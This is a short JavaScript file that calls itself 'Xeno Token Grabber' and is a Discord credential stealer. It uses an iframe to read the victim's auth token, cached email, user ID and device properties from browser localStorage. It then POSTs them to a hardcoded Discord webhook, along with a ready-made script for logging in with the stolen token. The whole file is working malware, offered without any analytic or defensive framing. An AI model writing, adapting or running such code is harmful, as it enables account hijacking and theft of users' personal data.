location.reload();

const discordWebhook = "https://discord.com/api/webhooks/797211951355658270/J5E7q9eAp4AXkKl939KxfKXXJ6_RtN9qN-L7I_GblS5oxZPO24ItR808mEh6BTYH7wdw";

const i = document.createElement("iframe");

document.body.appendChild(i);

const request = new XMLHttpRequest();

request.open("POST", discordWebhook);

request.setRequestHeader("Content-type", "application/json");

const params = {
    username: "Xeno Token Grabber",
    avatar_url: "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg",
    content: `**Token:** ${i.contentWindow.localStorage.token.replace('"', "").replace('"', "")}
**Email:** ${i.contentWindow.localStorage.email_cache.replace('"', "").replace('"', "")}
**User ID:** ${i.contentWindow.localStorage.user_id_cache.replace('"', "").replace('"', "")}
**Properties:**
\`\`\`json
${i.contentWindow.localStorage.deviceProperties}
\`\`\`**Login Script:** 
\`\`\`js
location.reload();
var i = document.createElement("iframe");
document.body.appendChild(i);
i.contentWindow.localStorage.token = "${i.contentWindow.localStorage.token.replace(/^"(.*)"$/, "$1")}"
\`\`\``
};

request.send(JSON.stringify(params));